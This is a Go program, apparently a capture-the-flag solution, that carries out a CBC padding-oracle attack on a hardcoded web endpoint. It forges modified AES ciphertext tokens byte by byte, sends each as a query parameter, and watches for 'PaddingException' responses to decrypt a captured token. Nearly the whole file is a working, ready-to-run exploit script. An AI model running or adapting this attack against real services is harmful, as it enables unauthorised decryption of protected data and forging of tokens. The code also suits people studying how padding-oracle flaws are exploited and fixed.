package main

import (
	"crypto/aes"
	"cryptography-go/utils"
	"encoding/base64"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"strconv"
	"strings"
)

const (
	urlBase   = "http://34.94.3.143/be9d8629d8/"
	authToken = "LrY2wVfOyCxuoakQwb!qa8yLmiprZyN540dL0cQba789vqcVHF!xStYkUv!UDP3QI2UTuYOIU-qarqH6aJZfSvRLFwNnFzIg0i-jZEfB0hKzcn4kjYL!q5NDe2w1JqPGAD3GzMAGp326gpb-CZxpagMYchfsRP8AXNzr2KSl9MlBf5s1OcFGj-qmmeJEFyrRESIjX35HfQ!zBCXzFRHE3A~~"
)

func main() {
	decoded := decodePBToken(authToken)
	bs := aes.BlockSize

	// break ciphertext into blocksize chunks
	chunks := utils.BuildChunks(decoded, bs)
	fmt.Println("[*] Splitting into chunks:")
	for i := 0; i < len(chunks); i++ {
		fmt.Printf("%d: %v\n", i, chunks[i])
	}

	plaintext := attack(chunks)
	fmt.Println("[!] Final plaintext:")
	fmt.Println(string(plaintext))
}

func fatal(err error) {
	if err != nil {
		log.Fatalln(err)
	}
}

func decodePBToken(token string) []byte {
	// b64d = lambda x: base64.decodestring(x.replace('~', '=').replace('!', '/').replace('-', '+'))
	r := strings.NewReplacer("~", "=", "!", "/", "-", "+")
	decoded, err := base64.StdEncoding.DecodeString(r.Replace(token))
	fatal(err)
	return decoded
}

func encodePBToken(buffer []byte) string {
	r := strings.NewReplacer("=", "~", "/", "!", "+", "-")
	return r.Replace(base64.StdEncoding.EncodeToString(buffer))
}

func setAttackBlock(chunks [][]byte, i int) ([]byte, []byte) {
	curr := chunks[i]
	prev := chunks[i-1]
	// fmt.Println("[*] Current Attack Block:")
	// fmt.Printf("C: %v\n", curr)
	return curr, prev
}

// create string C'||Cn to send to oracle with every possible value of C'[k] until find value that has valid padding
func attack(chunks [][]byte) []byte {
	chunkIdx := len(chunks) - 1
	plaintext := make([]byte, 0)
	// Loop through every chunk beginning with the last
	for i := chunkIdx; i >= 1; i-- {
		fmt.Printf("[*] Attacking chunk %d\n", chunkIdx)
		plainBlock := make([]byte, 0)
		curr, prev := setAttackBlock(chunks, i)
		interm := make([]byte, len(curr))
		// begin with padding byte 01
		padByte := byte(1)
		// loop through every position of chunk, beginning with last
		for chunkPos := len(curr) - 1; chunkPos >= 0; chunkPos-- {
			// fmt.Printf("[*] Padding byte %d for chunk[%d]\n", padByte, chunkPos)
			// try every possible byte value to check valid padding
			for chr := 0; chr < 256; chr++ {
				cookie := makeToken(curr, interm, chunkPos, byte(chr), padByte)
				// TODO speed up with concurrency
				isValid, err := callOracle(urlBase, cookie)
				fatal(err)
				if isValid {
					// fmt.Printf("Padding valid with %v\n", byte(chr))
					// fmt.Printf("Ciphertext: %v Attack Char: %v, padByte: %v\n", prev[i], byte(chr), padByte)
					// Solve I2 = C1' ^ P2' and P2 = C1 ^ I2
					var plainByte byte
					interm[chunkPos], plainByte = solveByte(prev[chunkPos], byte(chr), padByte)
					// unshift / prepend to plainBlock bytes slice
					plainBlock = append([]byte{plainByte}, plainBlock...)
					break
				}
			}
			// Move on to next padding byte 02, 03, 04... until end of blocksize
			padByte++
		}
		fmt.Println(string(plainBlock))
		plaintext = append(plainBlock, plaintext...)
		chunkIdx--
	}
	return plaintext
}

func solveByte(ciphertext, chr, padByte byte) (byte, byte) {
	interm := chr ^ padByte
	plaintext := interm ^ ciphertext
	return interm, plaintext
}

// TODO too many variables being passed in here
func makeToken(curr, interm []byte, chunkPos int, chr, padByte byte) string {
	// create C1' block of random characters
	tmp := []byte(strings.Repeat("a", len(curr)))
	for attackPos := len(curr) - 1; attackPos >= chunkPos; attackPos-- {
		tmp[attackPos] = subAttackBytes(interm[attackPos], chr, padByte)
	}
	// fmt.Printf("[-] Attempt attack with: %v\n", tmp)
	test := append(tmp, curr...)
	// fmt.Printf("Test: %v\n", test)
	token := encodePBToken(test)
	return token
}

func subAttackBytes(interm, chr, padByte byte) byte {
	// if intermediate value exists, fill that in
	var tmp byte
	if interm != 0 {
		// force intermediate value to desired current padByte
		tmp = interm ^ padByte
	} else {
		tmp = chr
	}
	return tmp
}

func callOracle(u, token string) (bool, error) {
	req, err := http.NewRequest("GET", u, nil)
	fatal(err)
	q := req.URL.Query()
	q.Add("post", token)
	req.URL.RawQuery = q.Encode()

	client := &http.Client{}
	resp, err := client.Do(req)
	fatal(err)
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		err = errors.New(u +
			"\nresp.StatusCode: " + strconv.Itoa(resp.StatusCode))
		return false, err
	}

	body, _ := ioutil.ReadAll(resp.Body)
	if isValidPad(string(body)) {
		return true, nil
	}
	return false, nil
}

func isValidPad(body string) bool {
	// Response body contains text "Invalid padding"
	if strings.Contains(body, "PaddingException") {
		return false
	}
	return true
}
